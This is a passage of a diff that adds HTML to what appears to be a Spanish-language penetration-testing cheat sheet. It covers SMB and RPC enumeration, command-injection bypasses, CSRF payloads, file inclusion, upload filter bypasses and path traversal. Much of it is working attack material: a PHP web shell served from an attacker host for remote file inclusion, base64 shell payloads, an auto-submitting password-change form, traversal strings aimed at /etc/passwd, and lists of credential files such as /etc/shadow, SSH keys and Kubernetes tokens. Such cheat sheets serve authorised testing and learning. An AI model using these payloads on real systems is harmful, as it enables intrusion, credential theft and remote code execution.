+                        style="color: rgb(180, 109, 68);">share</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </p>
+            </div>
+            <br>
+            <div class="command_into_command3" style="font-weight: bold; margin-top: 10px;">
+                <p style="color: rgb(53, 81, 98);"># null session</p>
+                <p><span style="color: rgb(20, 115, 120);">smbmap</span> <span
+                        style="color: rgb(180, 109, 68);">-H</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </p>
+                <p style="color: rgb(53, 81, 98);"># authenticated</p>
+                <p><span style="color: rgb(20, 115, 120);">smbmap</span> <span
+                        style="color: rgb(180, 109, 68);">-u</span> <span
+                        style="color: rgb(165, 165, 165);">"username"</span> <span
+                        style="color: rgb(180, 109, 68);">-p</span> <span
+                        style="color: rgb(165, 165, 165);">"password"</span> <span
+                        style="color: rgb(180, 109, 68);">-H</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </p>
+                <p style="color: rgb(53, 81, 98);"># recursive/non-recursive listing</p>
+                <p><span style="color: rgb(20, 115, 120);">smbmap</span> <span
+                        style="color: rgb(180, 109, 68);">[</span><span style="color: rgb(180, 109, 68);">-u</span>
+                    <span style="color: rgb(165, 165, 165);">"username"</span> <span
+                        style="color: rgb(180, 109, 68);">-p</span> <span
+                        style="color: rgb(165, 165, 165);">"password"</span><span
+                        style="color: rgb(180, 109, 68);">]</span> <span style="color: rgb(180, 109, 68);">-R/-r</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">share</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(180, 109, 68);">-H</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </p>
+            </div>
+            <br>
+            <div class="command_into_command3" style="font-weight: bold; margin-top: 10px;">
+                <p style="color: rgb(53, 81, 98);"># null session</p>
+                <p><span style="color: rgb(20, 115, 120);">crackmapexec</span> <span
+                        style="color: rgb(180, 109, 68);">smb</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">IP</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(180, 109, 68);">-u</span> <span style="color: rgb(165, 165, 165);">''</span>
+                    <span style="color: rgb(180, 109, 68);">-p</span> <span style="color: rgb(165, 165, 165);">''</span>
+                    <span style="color: rgb(180, 109, 68);">--shares</span>
+                </p>
+                <p style="color: rgb(53, 81, 98);"># authenticated</p>
+                <p><span style="color: rgb(20, 115, 120);">crackmapexec</span> <span
+                        style="color: rgb(180, 109, 68);">smb</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">IP</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(180, 109, 68);">-u</span> <span
+                        style="color: rgb(165, 165, 165);">'username'</span> <span
+                        style="color: rgb(180, 109, 68);">-p</span> <span
+                        style="color: rgb(165, 165, 165);">'password'</span> <span
+                        style="color: rgb(180, 109, 68);">--shares</span>
+                </p>
+            </div>
+            <br>
+            <div class="command_into_command3" style="font-weight: bold; margin-top: 10px;">
+                <p><span style="color: rgb(20, 115, 120);">nmap</span> <span style="color: rgb(180, 109, 68);">-p</span>
+                    <span style="color: rgb(180, 109, 68);">139,445</span> <span
+                        style="color: rgb(180, 109, 68);">--script</span> <span
+                        style="color: rgb(165, 165, 165);">"smb-enum-shares"</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </p>
+            </div>
+            <br><br>
+            <h3 style="font-weight: bold; font-size: 150%;">RPC</h3>
+            <br>
+            <p style="font-weight: bold;">Automated Enumeration</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">rpcdump.py</span> </span>
+                <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                    style="color: rgb(180, 109, 68)">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <p style="font-weight: bold;">Manual Enumeration</p>
+            <br>
+            <div class="command_into_command3" style="font-weight: bold; margin-top: 10px;">
+                <p style="color: rgb(53, 81, 98);"># null session</p>
+                <p><span style="color: rgb(20, 115, 120);">rpcclient</span> <span
+                        style="color: rgb(180, 109, 68);">-U</span> <span style="color: rgb(165, 165, 165);">""</span>
+                    <span style="color: rgb(180, 109, 68);">-N</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </p>
+                <p style="color: rgb(53, 81, 98);"># authenticated</p>
+                <p><span style="color: rgb(20, 115, 120);">rpcclient</span> <span
+                        style="color: rgb(180, 109, 68);">-U</span> <span
+                        style="color: rgb(165, 165, 165);">"username%passwd"</span>
+                    <span style="color: rgb(180, 109, 68);">-N</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </p>
+                <p style="color: rgb(53, 81, 98);"># commands
+                    https://www.hackingarticles.in/active-directory-enumeration-rpcclient/</p>
+                <p><span style="color: rgb(20, 115, 120);">rpcclient</span> <span
+                        style="color: rgb(180, 109, 68);">-U</span> <span
+                        style="color: rgb(165, 165, 165);">'[username%passwd]'</span>
+                    <span style="color: rgb(180, 109, 68);">-N</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(180, 109, 68);">-c</span> <span style="color: rgb(165, 165, 165);">'<span
+                            style="color: rgb(165, 165, 165)">&lt;</span><span
+                            style="color: rgb(165, 165, 165);">command</span><span
+                            style="color: rgb(165, 165, 165)">&gt;</span>'</span>
+                </p>
+            </div>
+        </div>
+        <div id="command-injection" class="content-item">
+            <h2>$ Command Injection _</h2>
+            <br>
+            <p>La inyección de comandos es una vulnerabilidad que permite
+                la ejecución de comandos arbitrarios en el servidor host, lo que podría provocar acceso no autorizado,
+                robo de datos o compromiso del sistema.</p>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Chaining and Invoking</h3>
+            <br>
+            <p>Se pueden combinar comandos (en sistemas Windows y Linux) utilizando estos operadores</p>
+            <div class="command_into_command3" style="font-weight: bold; margin-top: 10px;">
+                <p style="color: rgb(180, 109, 68);">; <span>‎ ‎ </span><span style="color: rgb(53, 81, 98);"># Executes
+                        one command
+                        and
+                        then another</span></p>
+                <p style="color: rgb(180, 109, 68);">& <span>‎ ‎ </span><span style="color: rgb(53, 81, 98);"># Executes
+                        a command in the background, followed by the other one</span></p>
+                <p style="color: rgb(180, 109, 68);">| <span>‎ ‎ </span><span style="color: rgb(53, 81, 98);">#
+                        Redirects the output the first command as input to the second command</span></p>
+                <p style="color: rgb(180, 109, 68);">&&<span>‎ ‎ </span><span style="color: rgb(53, 81, 98);">#
+                        Executes the second command if the first command succeeds</span></p>
+                <p style="color: rgb(180, 109, 68);">||<span>‎ ‎ </span><span style="color: rgb(53, 81, 98);">#
+                        Executes
+                        the second command if the first command fails</span></p>
+            </div>
+            <br><br>
+            <p>También es posible inyectar comandos mediante sustitución de comandos, donde la salida de un comando se
+                captura y se utiliza en otro contexto.</p>
+            <br>
+            <div class="command_into_command3" style="font-weight: bold; margin-top: 10px;">
+                <p style="color: rgb(193, 193, 193);">$(<span style="color: rgb(83, 151, 193);">command</span>) <span>‎
+                        ‎
+                    </span><span style="color: rgb(53, 81, 98);">#
+                        Both windows and linux systems</span></p>
+                <p style="color: rgb(193, 193, 193);">`<span style="color: rgb(83, 151, 193);">command</span>` <span>‎ ‎
+                        ‎
+                    </span><span style="color: rgb(53, 81, 98);">#
+                        Only linux systems</span></p>
+            </div>
+            <br><br>
+            <h3 style="font-weight: bold; font-size: 150%;">Bypasses</h3>
+            <br>
+            <div class="box">
+                <span>• </span><a
+                    href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#common-limitations-bypasses"
+                    target="_blank">HackTricks
+                    Link</a>
+                <br><br>
+                <span>• </span><a
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#filter-bypasses"
+                    target="_blank">GitHub
+                    Link</a>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Space Bypass</h3>
+            <br>
+            <span>Es posible utilizar el</span> <span style="font-weight: bold;">Internal Field Separator</span> <span
+                class="nmap-box" style="font-weight: bold;">$IFS</span> <span>para evitar el uso de espacios en los
+                comandos.</span>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">cat$</span><span
+                    style="color: rgb(175, 175, 175);">{IFS}</span><span
+                    style="color: rgb(20, 115, 120);">/etc/passwd</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Blacklisted Words</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(53, 81, 98); display: block; margin-top: 10px;"># Quotes</span>
+                <div style="margin-top: 10px;">
+                    <span style="color: rgb(20, 115, 120); display: block;"><span
+                            style="margin-right: 10px;">w'h'o'a'm'i'</span> <span>‎ ‎
+                        </span> <span style="color: rgb(53, 81, 98);"># Both windows and linux
+                            systems</span></span>
+                    <span style="color: rgb(20, 115, 120); display: block;"><span
+                            style="margin-right: 10px;">'w'h'o'a'm'i</span> <span>‎ ‎ </span> <span
+                            style="color: rgb(53, 81, 98);"># Only linux
+                            systems</span></span>
+                    <span style="color: rgb(20, 115, 120); display: block;"><span
+                            style="margin-right: 10px;">wh''oami</span> <span>‎ ‎ ‎ ‎ ‎ ‎</span> <span
+                            style="color: rgb(53, 81, 98);"># Both windows and
+                            linux
+                            systems</span></span>
+                </div>
+                <br>
+                <span style="color: rgb(53, 81, 98); display: block; margin-top: 10px;"># Backslashes</span>
+                <div style="margin-top: 10px;">
+                    <span style="color: rgb(20, 115, 120); display: block;"><span
+                            style="margin-right: 10px;">\w\h\o\a\m\i</span> <span>‎ ‎ </span> <span
+                            style="color: rgb(53, 81, 98);"># Only linux
+                            systems</span></span>
+                    <span style="color: rgb(20, 115, 120); display: block;"><span
+                            style="margin-right: 10px;">w\h\o\a\m\i</span> <span>‎ ‎ ‎</span> <span
+                            style="color: rgb(53, 81, 98);"># Only linux
+                            systems</span></span>
+                </div>
+                <br>
+                <span style="color: rgb(53, 81, 98); display: block; margin-top: 10px;"># $()</span>
+                <div style="margin-top: 10px;">
+                    <span style="color: rgb(20, 115, 120); display: block;"><span
+                            style="margin-right: 10px;">wh$()oami</span> <span>‎ ‎ ‎ ‎ ‎ ‎ ‎</span> <span
+                            style="color: rgb(53, 81, 98);"># Only linux
+                            systems</span></span>
+                    <span style="color: rgb(20, 115, 120); display: block;"><span style="margin-right: 10px;">wh$(echo
+                            oa)mi</span> <span>‎ ‎ </span><span style="color: rgb(53, 81, 98);"># Only linux
+                            systems</span></span>
+                </div>
+                <br>
+                <span style="color: rgb(53, 81, 98); display: block; margin-top: 10px;"># ``</span>
+                <div style="margin-top: 10px;">
+                    <span style="color: rgb(20, 115, 120); display: block;"><span
+                            style="margin-right: 10px;">wh``oami</span> <span>‎ ‎ ‎ ‎ ‎ ‎ ‎ </span> <span
+                            style="color: rgb(53, 81, 98);"># Only linux
+                            systems</span></span>
+                    <span style="color: rgb(20, 115, 120); display: block;"><span style="margin-right: 10px;">wh`echo
+                            oa`mi</span> <span>‎ ‎ </span> <span style="color: rgb(53, 81, 98);"># Only linux
+                            systems</span></span>
+                </div>
+                <br>
+                <span style="color: rgb(53, 81, 98); display: block; margin-top: 10px;"># $@</span>
+                <div style="margin-top: 10px;">
+                    <span style="color: rgb(20, 115, 120); display: block;"><span
+                            style="margin-right: 10px;">wh$@oami</span> <span>‎ ‎ </span><span
+                            style="color: rgb(53, 81, 98);"># Only linux systems</span></span>
+                </div>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">References</h3>
+            <br>
+            <div class="box">
+                <span>• </span><a
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+                    target="_blank">GitHub
+                    Link</a>
+                <br><br>
+                <span>• </span><a href="https://book.hacktricks.xyz/pentesting-web/command-injection"
+                    target="_blank">HackTricks
+                    Link</a>
+            </div>
+        </div>
+        <div id="csrf" class="content-item">
+            <h2>$ CSRF (Cross Site Request Forgery) _</h2>
+            <br>
+            <p>La falsificación de solicitudes entre sitios (CSRF) es una vulnerabilidad en la que un atacante engaña a
+                un usuario para que, sin saberlo, ejecute acciones en una aplicación web en la que está autenticado, lo
+                que lleva a que se realicen acciones no autorizadas sin el consentimiento o conocimiento del usuario.
+            </p>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Payloads</h3>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">GET</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(225, 225, 225); display: block; margin-top: 10px;"># Requires user
+                    interaction</span>
+                <div style="margin-top: 10px;">
+                    <span style="color: rgb(165, 165, 165)">&lt;</span>a <span
+                        style="color: rgb(20, 115, 120);">href</span><span
+                        style="color: rgb(180, 109, 68);">=</span>"http://<span
+                        style="color: rgb(165, 165, 165)">&lt;</span>host<span
+                        style="color: rgb(165, 165, 165)">&gt;</span>/changepasswd.php?pass=pass"<span
+                        style="color: rgb(165, 165, 165)">&gt;</span>Click Me<span
+                        style="color: rgb(165, 165, 165)">&lt;</span>/a<span
+                        style="color: rgb(165, 165, 165)">&gt;</span>
+                </div>
+                <br>
+                <span style="color: rgb(225, 225, 225); display: block; margin-top: 10px;"># No user interaction
+                    required</span>
+                <div style="margin-top: 10px;">
+                    <span style="color: rgb(165, 165, 165)">&lt;</span>img <span
+                        style="color: rgb(20, 115, 120);">src</span><span
+                        style="color: rgb(180, 109, 68);">=</span>"http://<span
+                        style="color: rgb(165, 165, 165)">&lt;</span>host<span
+                        style="color: rgb(165, 165, 165)">&gt;</span>/changepasswd.php?pass=pass"<span
+                        style="color: rgb(165, 165, 165)">&gt;</span>
+                </div>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">POST</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                &lt;form <span style="color: rgb(20, 115, 120);">id</span><span
+                    style="color: rgb(180, 109, 68);">=</span>"form" <span
+                    style="color: rgb(20, 115, 120);">action</span><span
+                    style="color: rgb(180, 109, 68);">=</span>"http://&lt;host&gt;/changepasswd.php" <span
+                    style="color: rgb(20, 115, 120);">method</span><span
+                    style="color: rgb(180, 109, 68);">=</span>"POST"&gt;<br>
+                &nbsp;&lt;input <span style="color: rgb(20, 115, 120);">name</span><span
+                    style="color: rgb(180, 109, 68);">=</span>"pass" <span
+                    style="color: rgb(20, 115, 120);">type</span><span
+                    style="color: rgb(180, 109, 68);">=</span>"hidden" <span
+                    style="color: rgb(20, 115, 120);">value</span><span style="color: rgb(180, 109, 68);">=</span>"pass"
+                /&gt;<br>
+                &nbsp;&lt;input <span style="color: rgb(20, 115, 120);">type</span><span
+                    style="color: rgb(180, 109, 68);">=</span>"submit" <span
+                    style="color: rgb(20, 115, 120);">value</span><span
+                    style="color: rgb(180, 109, 68);">=</span>"Submit" /&gt;<br>
+                &lt;/form&gt;<br><br>
+
+                &lt;-- Auto submit --&gt;<br>
+                &lt;script&gt;<br>
+                &nbsp;<span style="color: rgb(207, 149, 82);">document</span><span
+                    style="color: rgb(20, 115, 120);">.getElementById</span>("form")<span
+                    style="color: rgb(20, 115, 120);">.submit</span>();<br>
+                &lt;/script&gt;
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">References</h3>
+            <br>
+            <div class="box">
+                <span>• </span><a
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection"
+                    target="_blank">GitHub
+                    Link</a>
+                <br><br>
+                <span>• </span><a href="https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery"
+                    target="_blank">HackTricks
+                    Link</a>
+            </div>
+        </div>
+        <div id="file-inclusion" class="content-item">
+            <h2>$ File Inclusion _</h2>
+            <br>
+            <p>La inclusión de archivos locales (LFI) y la inclusión de archivos remotos (RFI) son vulnerabilidades de
+                aplicaciones web donde un atacante puede manipular rutas de archivos para incluir archivos, ya sea desde
+                el sistema local (LFI) o servidores remotos (RFI), lo que podría conducir a acceso o código no
+                autorizado. ejecución.
+            </p>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Remote File Inclusion (RFI)</h3>
+            <br>
+            <p>Si encontramos una manera de incluir un archivo remoto, podríamos intentar incluir código php para
+                ejecutar comandos en el host.
+            </p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span>http://</span><span>&lt;</span><span>host</span><span>&gt;</span><span>/index.php?page=http://</span><span>&lt;</span><span>attacker</span><span>&gt;</span><span>/shell.txt</span>
+            </div>
+            <br>
+            <p>Podríamos servir un código PHP malicioso para que el host lo interprete.
+            </p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">echo</span> '<span>&lt;?php system($_GET["cmd"]);?&gt;</span>'
+                <span style="color: rgb(167, 82, 33)">&gt;</span> <span
+                    style="color: rgb(180, 109, 68);">shell.txt</span><br>
+                <span style="color: rgb(20, 115, 120);">python3</span> <span style="color: rgb(180, 109, 68);">-m
+                    http.server</span> <span style="color: rgb(191, 151, 32);">80</span><br>
+                <div class="command_into_command" style="font-weight: bold;">
+                    <span style="color: rgb(24, 63, 65);">curl</span>
+                    'http://&lt;host&gt;/index.php?page=http://&lt;attacker&gt;/shell.txt&amp;cmd=&lt;comand&gt;'
+                </div>
+            </div>
+            <br>
+            <span>Si el servidor estuviera bloqueando el acceso a recursos externos, podríamos intentar usar el
+                contenedor</span> <span class="nmap-box" style="font-weight: bold;">data://</span> <span>para inyectar
+                código PHP
+                como base64.</span>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4K<br><br>
+                php://filter/convert.base64-<br>
+                decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4K
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Local File Inclusion (LFI)</h3>
+            <br>
+            <strong>Absolute Path
+            </strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                http://&lt;hsot&gt;/index.php?page=/etc/passwd
+            </div>
+            <br>
+            <strong>Relative Path Traversal
+            </strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                http://&lt;hsot&gt;/index.php?page=../../../etc/passwd
+            </div>
+            <br>
+            <strong>Null Byte
+            </strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                http://&lt;hsot&gt;/index.php?page=../../../etc/passwd%00
+            </div>
+            <br>
+            <strong>Encoding
+            </strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                http://&lt;hsot&gt;/index.php?page=%252e%252e%252fetc%252fpasswd<br>
+                http://&lt;hsot&gt;/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+            </div>
+            <br>
+            <strong>Truncation
+            </strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                http://&lt;hsot&gt;/index.php?page=../../../etc/passwd......[ADD MORE]<br>
+                http://&lt;hsot&gt;/index.php?page=../../../[ADD MORE]../../../etc/passwd
+            </div>
+            <br>
+            <strong>Filtered characters
+            </strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                http://&lt;hsot&gt;/index.php?page=....//....//....//etc/passwd
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">References</h3>
+            <br>
+            <div class="box">
+                <span>• </span><a
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+                    target="_blank">GitHub
+                    Link</a>
+                <br><br>
+                <span>• </span><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+                    target="_blank">HackTricks
+                    Link</a>
+            </div>
+        </div>
+        <div id="file-upload" class="content-item">
+            <h2>$ File Upload _</h2>
+            <br>
+            <p>La vulnerabilidad <strong>File Upload</strong> en aplicaciones web ocurre cuando los usuarios pueden
+                cargar
+                archivos sin la validación adecuada, lo que potencialmente permite que se carguen y ejecuten archivos
+                maliciosos en el servidor, lo que provoca acceso no autorizado, violaciones de datos o compromiso del
+                sistema.
+            </p>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Extensions</h3>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">PHP</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                .php<br>
+                .php2<br>
+                .php3<br>
+                .php4<br>
+                .php5<br>
+                .php7<br>
+                .pht<br>
+                .phpt<br>
+                .phtm<br>
+                .phtml<br>
+                .phps<br>
+                .phar<br>
+                .hphp<br>
+                .module<br>
+                .inc<br>
+                .ctp<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">ASP</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                .asp<br>
+                .aspx<br>
+                .config<br>
+                .ashx<br>
+                .asmx<br>
+                .aspq<br>
+                .axd<br>
+                .cshtm<br>
+                .cshtml<br>
+                .rem<br>
+                .soap<br>
+                .vbhtm<br>
+                .vbhtml<br>
+                .asa<br>
+                .cer<br>
+                .shtml<br>
+            </div>
+            <br>
+            <span>• </span><strong>Jsp:</strong> <span class="nmap-box" style="font-weight: bold;">.jsp, .jspx, .jsw,
+                .jsv, .jspf, .wss, .do, .action</span>
+            <br><br>
+            <span>• </span><strong>Coldfusion:</strong> <span class="nmap-box" style="font-weight: bold;">.cfm, .cfml,
+                .cfc, .dbm</span>
+            <br><br>
+            <span>• </span><strong>Flash:</strong> <span class="nmap-box" style="font-weight: bold;">.swf</span>
+            <br><br>
+            <span>• </span><strong>Perl:</strong> <span class="nmap-box" style="font-weight: bold;">.pl, .pm, .cgi,
+                .lib</span>
+            <br><br>
+            <span>• </span><strong>Node.js:</strong> <span class="nmap-box" style="font-weight: bold;">.js, .json,
+                .node</span>
+            <br><br>
+            <h3 style="font-weight: bold; font-size: 150%;">Filter Bypass</h3>
+            <br>
+            <strong>Uppercase letters:</strong> <span class="nmap-box" style="font-weight: bold;">.pHp, .pHP5,
+                .PhAr</span>
+            <br><br>
+            <strong>Double extension:</strong>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">.png.php</span>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">.gif.php</span>
+            <br><br>
+            <strong>Null byte:</strong>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">.php%00.gif</span>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">.php\x00.gif</span>
+            <br><br>
+            <strong>Special chars:</strong>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">file.php%20</span>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">file.php%0a</span>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">file.php%0d%0a</span>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">file.php/</span>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">file.php.\</span>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">file.php....</span>
+            <br><br>
+            <strong>Content-Type:</strong>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">Content-Type : image/gif</span>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">Content-Type : image/png</span>
+            <br><br>
+            <span>• </span> <span class="nmap-box" style="font-weight: bold;">Content-Type : image/jpeg</span>
+            <br><br>
+            <strong>Magic numbers:</strong>
+            <br><br>
+            <span>• </span><strong>GIF:</strong> <span class="nmap-box" style="font-weight: bold;">GIF8;</span>
+            <br><br>
+            <span>• </span><strong>PNG:</strong> <span class="nmap-box"
+                style="font-weight: bold;">\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[</span>
+            <br><br>
+            <span>• </span><strong>JPG:</strong> <span class="nmap-box" style="font-weight: bold;">\xff\xd8\xff</span>
+            <br><br>
+            <h3 style="font-weight: bold; font-size: 150%;">References</h3>
+            <br>
+            <div class="box">
+                <span>• </span><a
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files"
+                    target="_blank">GitHub
+                    Link</a>
+                <br><br>
+                <span>• </span><a href="https://book.hacktricks.xyz/pentesting-web/file-upload"
+                    target="_blank">HackTricks
+                    Link</a>
+            </div>
+        </div>
+        <div id="nosql-injection" class="content-item">
+            <h2>$ NoSQL Injection _</h2>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">
+                COMING SOON
+            </h3>
+        </div>
+        <div id="path-traversal" class="content-item">
+            <h2>$ Path Traversal _</h2>
+            <br>
+            <p>La vulnerabilidad de recorrido de ruta ocurre cuando una aplicación maneja incorrectamente la entrada del
+                usuario en las rutas de los archivos, lo que permite a los atacantes manipular la ruta para acceder a
+                directorios y archivos fuera del alcance previsto. Esto puede provocar acceso no autorizado a archivos
+                confidenciales, exposición de datos confidenciales y potencialmente comprometer todo el sistema.
+            </p>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Basic Payloads</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                ../<br>
+                ..\<br>
+                ..\/<br>
+                %2e%2e%2f<br>
+                %252e%252e%252f<br>
+                %c0%ae%c0%ae%c0%af<br>
+                %uff0e%uff0e%u2215<br>
+                %uff0e%uff0e%u2216<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Bypasses</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(53, 81, 98);"># If WAF removing "../"</span><br>
+                ..././<br>
+                ...\.\<br>
+                ..;/<br>
+                <br>
+                <span style="color: rgb(53, 81, 98);"># Double URL encoding</span><br>
+                <span style="color: rgb(180, 109, 68);">. = %252e</span><br>
+                <span style="color: rgb(180, 109, 68);">/ = %252f</span><br>
+                <span style="color: rgb(180, 109, 68);">\ = %255c</span><br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Interesting Files</h3>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Linux</h3>
+            <br>
+            <strong>Interesting files:</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                /etc/issue<br>
+                /etc/passwd<br>
+                /etc/shadow<br>
+                /etc/group<br>
+                /etc/hosts<br>
+                /etc/motd<br>
+                /etc/mysql/my.cnf<br>
+                /proc/[0-9]*/fd/[0-9]* (first number is the PID, second is the filedescriptor)<br>
+                /proc/self/environ<br>
+                /proc/version<br>
+                /proc/cmdline<br>
+                /proc/sched_debug<br>
+                /proc/mounts<br>
+                /proc/net/arp<br>
+                /proc/net/route<br>
+                /proc/net/tcp<br>
+                /proc/net/udp<br>
+                /proc/self/cwd/index.php<br>
+                /proc/self/cwd/main.py<br>
+                /home/$USER/.bash_history<br>
+                /home/$USER/.ssh/id_rsa<br>
+                /run/secrets/kubernetes.io/serviceaccount/token<br>
+                /run/secrets/kubernetes.io/serviceaccount/namespace<br>
+                /run/secrets/kubernetes.io/serviceaccount/certificate<br>
+                /var/run/secrets/kubernetes.io/serviceaccount<br>
+                /var/lib/mlocate/mlocate.db<br>
+                /var/lib/plocate/plocate.db<br>
+                /var/lib/mlocate.db<br>
+            </div>
+            <br>
+            <strong>Possible payload injectable files:</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                /var/log/apache/access.log<br>
+                /var/log/apache/error.log<br>
+                /var/log/httpd/error_log<br>
+                /usr/local/apache/log/error_log<br>
+                /usr/local/apache2/log/error_log<br>
+                /var/log/nginx/access.log<br>
+                /var/log/nginx/error.log<br>
+                /var/log/vsftpd.log<br>
+                /var/log/sshd.log<br>
+                /var/log/mail<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Windows</h3>
+            <br>
+            <strong>Interesting files:</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">c:/boot.ini</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/inetpub/logs/logfiles</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/inetpub/wwwroot/global.asa</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/inetpub/wwwroot/index.asp</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/inetpub/wwwroot/web.config</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/sysprep.inf</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/sysprep.xml</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/sysprep/sysprep.inf</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/sysprep/sysprep.xml</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/system32/inetsrv/metabase.xml</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/sysprep.inf</span><br>
